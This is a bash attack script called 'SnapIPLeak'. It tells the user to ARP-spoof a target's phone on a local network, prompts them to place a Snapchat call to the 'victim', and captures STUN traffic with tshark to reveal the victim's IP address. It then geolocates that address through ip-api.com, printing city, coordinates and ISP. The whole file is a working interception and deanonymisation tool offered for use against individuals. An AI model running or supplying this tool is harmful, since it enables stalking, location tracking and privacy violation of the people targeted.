#!/bin/bash

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

if [[ $EUID -ne 0 ]]; then
    echo -e "\e[1;31m\nThis script must be run as 'root' user.\n\e[0m"
    exit 1
fi

install_package() {
    package_name=$1
    if ! command -v $package_name &> /dev/null; then
        echo -e "\e[1;35m\nInstalling $package_name...\e[0m"
        sudo apt update && sudo apt install -y $package_name
        if [ $? -ne 0 ]; then
            echo -e "\e[1;31m\n\n[!] There was an error installing $package_name...\n\e[0m"
            exit 1
        fi
    fi
}

install_package "figlet"
install_package "curl"
install_package "tshark"

clear && figlet "SnapIPLeak"
echo -e "${greenColour}\nMade by OusCyb3rH4ck\n${endColour}"

sleep 1
read -rep $'\e[0;33m\033[1m[+] Do you want to start the Snapchat IP Leak process? [Y/n]: \033[0m' start
start=${start:-Y}

if [[ "$start" =~ ^[Y]$ ]]; then
    echo -e "\n${blueColour}[+] Starting the Snapchat IP Leak process...${endColour}\n"
    sleep 2

    interface_default=$(ip route | grep default | awk '{print $5}')
    printf "${turquoiseColour}[+] Enter your Network Interface (default: $interface_default): ${endColour}"
    read interface
    interface=${interface:-$interface_default}
    echo -e "${greenColour}[+] Using Interface: $interface${endColour}\n"

    sudo sysctl net.ipv4.ip_forward=1 &>/dev/null
    echo -e "${purpleColour}[+] IP Forwarding enabled...${endColour}"
    sleep 2

    read -rep $'\e[0;37m\033[1m\n[+] Enter the phone IP address (e.g., 192.168.1.52): \033[0m' phone_ip
    sleep 1
    echo -e "${grayColour}\n[!] Run this command in another terminal for ARP Spoofing:${endColour} sudo arpspoof -i eth0 -t ${phone_ip} 192.168.1.1\n"
    sleep 5
    
    read -rep $'\e[0;37m\033[1m[?] Did you run the command for ARP Spoofing? [Y/n]: \033[0m' arp_spoofing
    arp_spoofing=${arp_spoofing:-Y}
    if [[ "$arp_spoofing" =~ ^[Y]$ ]]; then
        echo -e "${redColour}\n[!] Please, call the victim and wait for 5 seconds minimum...\n${endColour}"
        sleep 3
        echo -e "${greenColour}\n[+] Starting the packet capture and leaking the victim's IP...${endColour}"
        
        while true; do
            timeout 10 sudo tshark -i $interface -f "ip host $phone_ip" -Y "stun && stun.type == 0x0001 && stun.attribute == 0x0006" -T fields -e ip.dst 2>/dev/null > output.txt
            if [ -s output.txt ]; then
                victim_ip=$(cat output.txt | sort -u)
                echo -e "${greenColour}\n[+] Victim's IP:${endColour} $victim_ip\n"
                rm -rf output.txt
                break
            fi
        done
        
        read -rep $'\e[0;33m\033[1m[?] Do you want to get more info about the IP address? [Y/n]: \033[0m' get_info
        get_info=${get_info:-Y}
        if [[ "$get_info" =~ ^[Y]$ ]]; then
            echo; curl -s -X GET "http://ip-api.com/json/$victim_ip?fields=66846719" | jq -r --arg turquoiseColour "$turquoiseColour" --arg endColour "$endColour" '
            "\($turquoiseColour)Status:\($endColour) \(.status)\n" +
            "\($turquoiseColour)IP Address:\($endColour) \(.query)\n" +
            "\($turquoiseColour)Continent:\($endColour) \(.continent) (\(.continentCode))\n" +
            "\($turquoiseColour)Country:\($endColour) \(.country) (\(.countryCode))\n" +
            "\($turquoiseColour)Region:\($endColour) \(.regionName) (\(.region))\n" +
            "\($turquoiseColour)City:\($endColour) \(.city)\n" +
            "\($turquoiseColour)District:\($endColour) \(.district)\n" +
            "\($turquoiseColour)ZIP Code:\($endColour) \(.zip)\n" +
            "\($turquoiseColour)Latitude:\($endColour) \(.lat)\n" +
            "\($turquoiseColour)Longitude:\($endColour) \(.lon)\n" +
            "\($turquoiseColour)Timezone:\($endColour) \(.timezone) (UTC Offset: \(.offset))\n" +
            "\($turquoiseColour)Currency:\($endColour) \(.currency)\n" +
            "\($turquoiseColour)ISP:\($endColour) \(.isp)\n" +
            "\($turquoiseColour)Organization:\($endColour) \(.org)\n" +
            "\($turquoiseColour)AS Info:\($endColour) \(.as) (\(.asname))\n" +
            "\($turquoiseColour)Reverse DNS:\($endColour) \(.reverse)\n" +
            "\($turquoiseColour)Mobile Connection:\($endColour) \(.mobile)\n" +
            "\($turquoiseColour)Proxy:\($endColour) \(.proxy)\n" +
            "\($turquoiseColour)Hosting Service:\($endColour) \(.hosting)"
            ' > ip_info.txt
            echo -e "$(cat ip_info.txt)"
            rm -rf ip_info.txt; echo
        fi
    fi
fi
